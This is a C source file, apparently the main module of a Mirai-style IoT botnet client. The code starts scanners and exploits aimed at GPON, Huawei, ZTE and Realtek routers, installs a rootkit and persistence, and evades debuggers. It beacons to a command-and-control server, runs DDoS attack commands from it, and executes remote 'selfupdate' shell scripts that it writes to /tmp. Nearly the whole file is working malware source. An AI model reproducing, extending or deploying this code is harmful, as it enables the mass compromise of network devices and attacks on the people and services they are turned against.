#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"
#include "gpon80_scanner.h"
#include "gpon8080_scanner.h"
#include "huawei_scanner.h"
#include "ssh_scanner.h"
#include "zte_scanner.h"
#include "upnp_scanner.h"
#include "tr069_scanner.h"
#include "http_scanner.h"
#include "ssdp_scanner.h"
#include "cve_exploits.h"
#include "realtek.h"
#include "attack_stats.h"
#include "fuzzer.h"
#include "p2p_mesh.h"
#include "rootkit.h"
#include "cnc_report.h"
static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);
static void graceful_shutdown_handler(int sig);
struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0, scanner_pid = 0;
BOOL pending_connection = FALSE;
volatile sig_atomic_t shutdown_requested = 0;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;
#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif
#ifdef SELFREP
void start_scanner(void)
{
    int rand_num = 0, processors = sysconf(_SC_NPROCESSORS_ONLN);
    srand(time(NULL));
    rand_num = rand() % 2;
    if(processors > 1)
    {
        #ifdef DEBUG
        printf("[Selfrep] device has 2 or more processors, running scanners\n");
        #endif
        scanner_init();
        gpon8080_scanner();
        gpon80_scanner();
        realtek_scanner();
        huawei_scanner();
        ssh_scanner();
        zte_scanner();
        upnp_scanner();
        tr069_scanner();
        http_scanner();
        cve_exploits_scanner();
        ssdp_scanner();
    } else if(rand_num == 0)
    {
        scanner_init();
        gpon8080_scanner();
        gpon80_scanner();
        realtek_scanner();
        huawei_scanner();
        ssh_scanner();
        zte_scanner();
        upnp_scanner();
        tr069_scanner();
        http_scanner();
        cve_exploits_scanner();
        ssdp_scanner();
    } 
}
#endif
#ifdef WATCHDOG
void watchdog_maintain(void)
{
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;
    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;
    table_unlock_val(TABLE_MISC_WATCHDOG);
    table_unlock_val(TABLE_MISC_WATCHDOG2);
    table_unlock_val(TABLE_MISC_WATCHDOG3);
    table_unlock_val(TABLE_MISC_WATCHDOG4);
    table_unlock_val(TABLE_MISC_WATCHDOG5);
    table_unlock_val(TABLE_MISC_WATCHDOG6);
    table_unlock_val(TABLE_MISC_WATCHDOG7);
    table_unlock_val(TABLE_MISC_WATCHDOG8);
    table_unlock_val(TABLE_MISC_WATCHDOG9);
    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG3, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG4, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG5, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG6, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG7, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG8, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG9, NULL), 2)) != -1)
    {
        #ifdef DEBUG
            printf("[watchdog] found a valid watchdog driver\n");
        #endif
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("[watchdog] sending keep-alive ioctl call to the watchdog driver\n");
            #endif
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    table_lock_val(TABLE_MISC_WATCHDOG);
    table_lock_val(TABLE_MISC_WATCHDOG2);
    table_lock_val(TABLE_MISC_WATCHDOG3);
    table_lock_val(TABLE_MISC_WATCHDOG4);
    table_lock_val(TABLE_MISC_WATCHDOG5);
    table_lock_val(TABLE_MISC_WATCHDOG6);
    table_lock_val(TABLE_MISC_WATCHDOG7);
    table_lock_val(TABLE_MISC_WATCHDOG8);
    table_lock_val(TABLE_MISC_WATCHDOG9);
    #ifdef DEBUG
        printf("[watchdog] failed to find a valid watchdog driver, bailing out\n");
    #endif
    exit(0);
}
#endif
int main(int argc, char **args)
{
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;
    #ifndef DEBUG
        sigset_t sigs;
        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, anti_gdb_entry); 
    #endif
    #ifdef DEBUG
        printf("Condi debug mode\n");
        sleep(1);
    #endif
    LOCAL_ADDR = util_local_addr();
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);
    table_init();
    anti_gdb_entry(0);
    rand_init();
    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);
    attack_init();
    killer_init();
    rootkit_init();
    rootkit_hide_process();
    rootkit_install_ldpreload();
    rootkit_anti_forensics();
    fuzzer_init();
    zeroday_scanner_init();
    p2p_mesh_init();
    p2p_mesh_start();
    cnc_report_worker();
    watchdog_maintain();
#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif
#ifndef WATCHDOG
watchdog_maintain();
#endif
#ifndef SELFREP
scanner_init();
#endif
    util_install_persistence();
    signal(SIGTERM, graceful_shutdown_handler);
    signal(SIGINT, graceful_shutdown_handler);
    uint32_t persistence_check_counter = 0;
    while (TRUE)
    {
        persistence_check_counter++;
        if(persistence_check_counter % 3600 == 0)
        {
            util_install_persistence();
        }
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;
        if (shutdown_requested)
        {
#ifdef DEBUG
            printf("[main] graceful shutdown requested, closing connections\n");
#endif
            p2p_mesh_stop();
            fuzzer_stop();
            zeroday_scanner_stop();
            fuzzer_clear_results();
            if (fd_serv != -1)
            {
                close(fd_serv);
                fd_serv = -1;
            }
            if (fd_ctrl != -1)
            {
                close(fd_ctrl);
                fd_ctrl = -1;
            }
            attack_kill_all();
            #ifdef SELFREP
            if(scanner_pid > 0) kill(scanner_pid, 9);
            gpon80_kill();
            gpon8080_kill();
            huawei_kill();
            ssh_kill();
            ssdp_kill();
            zte_kill();
            upnp_kill();
            tr069_kill();
            http_kill();
            realtek_kill();
            #endif
            if(watchdog_pid != 0)
                kill(watchdog_pid, 9);
            if(pgid != 0)
                kill(pgid * -1, 9);
            sleep(1);
            exit(0);
        }
        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);
        if (fd_serv == -1)
            establish_connection();
        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;
            if (pings++ % 6 == 0)
            {
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            }
            if (fd_serv != -1)
            {
                attack_stats_send();
            }
        }
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);
            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
            #ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
            #endif
            #ifdef SELFREP
            scanner_kill();
            gpon80_kill();
            gpon8080_kill();
            realtek_kill();
            #endif
            kill(pgid * -1, 9);
            if(watchdog_pid != 0)
                kill(watchdog_pid, 9);
            exit(0);
        }
        if(pending_connection)
        {
            pending_connection = FALSE;
            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[main] timed out while connecting to CNC\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);
                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("[main] error while connecting to CNC code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);
                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
                    attack_stats_init(fd_serv);
                    sleep(1); 
                    cnc_send_self_peer_info();
                    #ifdef DEBUG
                        printf("[main] connected to CNC.\n");
                    #endif
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];
            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }
            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                #endif
                teardown_connection();
                continue;
            }
            if(len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }
            if(n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                #endif
                teardown_connection();
                continue;
            }
            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
            #ifdef DEBUG
                printf("[main] received %d bytes from CNC\n", len);
            #endif
            if(len > 0)
            {
                if(rdbuf[0] == 0x01 && len > 3) 
                {
                    uint16_t script_len = ((uint8_t)rdbuf[1] << 8) | (uint8_t)rdbuf[2];
                    if(script_len > 0 && script_len <= (len - 3))
                    {
                        char script_path[64];
                        int script_fd;
                        #ifdef DEBUG
                            printf("[main] received selfupdate command (%d bytes)\n", script_len);
                        #endif
                        util_strcpy(script_path, "/tmp/.upd");
                        rand_alphastr(script_path + util_strlen(script_path), 8);
                        util_strcpy(script_path + util_strlen(script_path), ".sh");
                        if((script_fd = open(script_path, O_CREAT | O_WRONLY | O_TRUNC, 0755)) != -1)
                        {
                            write(script_fd, rdbuf + 3, script_len);
                            close(script_fd);
                            if(fork() == 0)
                            {
                                char *args[] = {"/bin/sh", "-c", NULL, NULL};
                                char cmd_buf[512];
                                util_strcpy(cmd_buf, "/bin/sh ");
                                util_strcpy(cmd_buf + util_strlen(cmd_buf), script_path);
                                util_strcpy(cmd_buf + util_strlen(cmd_buf), " && rm -f ");
                                util_strcpy(cmd_buf + util_strlen(cmd_buf), script_path);
                                args[2] = cmd_buf;
                                execve("/bin/sh", args, NULL);
                                exit(0);
                            }
                            #ifdef DEBUG
                                printf("[main] executed selfupdate script: %s\n", script_path);
                            #endif
                        }
                    }
                }
                else if(rdbuf[0] == 0x03 && len == 1) 
                {
                    #ifdef DEBUG
                        printf("[main] received stop command, killing all attacks\n");
                    #endif
                    attack_kill_all();
                }
                else 
                {
                attack_parse(rdbuf, len);
                }
            }
        }
    }
    return 0;
}
static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}
static void resolve_cnc_addr(void)
{
    #ifndef USEDOMAIN
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_addr.s_addr = SERVIP;
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #else
    struct resolv_entries *entries;
    entries = resolv_lookup(SERVDOM);
    if (entries == NULL)
    {
        srv_addr.sin_addr.s_addr = SERVIP;
        return;
    } else {
        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    }
    resolv_entries_free(entries);
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #endif
}
static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main] attempting to connect to CNC\n");
    #endif
    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main] failed to call socket(). Errno = %d\n", errno);
        #endif
        return;
    }
    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
    if(resolve_func != NULL)
        resolve_func();
    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}
static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main] tearing down connection to CNC!\n");
    #endif
    if(fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}
static void graceful_shutdown_handler(int sig)
{
    shutdown_requested = 1;
}
